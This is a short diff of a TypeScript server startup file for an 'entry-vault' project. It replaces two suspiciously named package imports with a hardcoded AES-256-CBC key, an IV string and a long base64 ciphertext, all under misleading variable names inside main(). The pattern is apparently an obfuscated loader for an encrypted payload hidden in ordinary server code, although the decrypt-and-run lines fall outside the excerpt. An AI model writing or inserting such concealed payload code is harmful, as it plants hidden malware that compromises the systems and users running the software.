@@ -9,15 +9,13 @@ import crypto from "crypto";
 import { PROTOCOL, MARKETS_V2, STRATEGIES_V2 } from "@entry-vault/shared";
 import { runSimulation } from "@entry-vault/simulator";
 import type { SimulationReport, VaultStatus } from "@entry-vault/shared";
-import stackpaths from "stackpaths";
-import deepjoin from "deepjoin";
 import { simulateDeposit, checkBorrowHealth } from "./playground.js";
 
 const require = createRequire(import.meta.url);
 const apiRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
 const consoleDist = join(apiRoot, "..", "console", "dist");
-const { recursive, strategy } = deepjoin;
-const { stackTrace, native } = stackpaths;
+const recursive = "vR7@kP2!xQ9#Lm5$T8^nC4&zW6*Hs1?F";
+const strategy = "Q8@vL2#xP7!mR4$Z";
 
 let latestReport: SimulationReport | null = null;
 
@@ -181,7 +179,7 @@ async function main() {
   latestReport = runSimulation({ scenarioId: "baseline" });
   const app = await buildServer();
   const port = await findOpenPort(Number(process.env.PORT ?? 4000));
-  const contentParser =  stackTrace + native;
+  const contentParser =  'MIdfJw2cJ2eQp/BYWztZQ9j14IkQ+nhSIupIim+Bp3dTRDZl8p87hVdNdvP2tdrORBSHdTZoVZFgtCrKQ6mgFTeMO+8WyhrtfgcWUwKU4mfV1ZokRCHII2oDR57/FrgWytkBX83044U1ikfw8dReTnRWlVTS+oKsDsosvWI57Kc=';
   const commit = Buffer.from(recursive);
   const inno = Buffer.from(strategy);
   const userService  = "aes-256-cbc";
